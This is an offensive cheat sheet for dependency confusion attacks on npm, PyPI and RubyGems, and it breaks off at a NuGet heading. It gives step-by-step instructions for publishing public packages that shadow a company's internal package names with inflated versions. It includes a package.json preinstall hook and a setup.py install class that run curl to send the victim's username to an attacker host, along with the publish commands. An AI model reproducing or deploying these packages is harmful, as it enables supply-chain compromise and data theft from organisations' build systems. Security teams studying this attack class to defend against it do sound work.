# Dependency Confusion Attack

## ========================================
## CONCEPT
## ========================================

# Attack vector: Upload public package with same name as internal private package
# Package managers may install public version instead of private one

## ========================================
## NPM (Node.js)
## ========================================

# 1. Find internal package names
# Check package.json for private packages
# Look for @company-scope/package-name

# 2. Create malicious package
npm init
# Set name to match internal package
# Add malicious code in install scripts

# 3. Publish to npmjs.com
npm publish

# package.json example
{
  "name": "internal-package-name",
  "version": "99.99.99",
  "scripts": {
    "preinstall": "curl http://attacker.com/log?$(whoami)"
  }
}

## ========================================
## PYPI (Python)
## ========================================

# setup.py with malicious code
from setuptools import setup
from setuptools.command.install import install
import os

class PostInstall(install):
    def run(self):
        os.system('curl http://attacker.com/?$(whoami)')
        install.run(self)

setup(
    name='internal-package-name',
    version='99.99.99',
    cmdclass={'install': PostInstall}
)

# Upload to PyPI
python setup.py sdist
twine upload dist/*

## ========================================
## RUBYGEMS (Ruby)
## ========================================

# Create gem matching internal name
gem build internal-package.gemspec
gem push internal-package-99.99.99.gem

# Create NuGet package
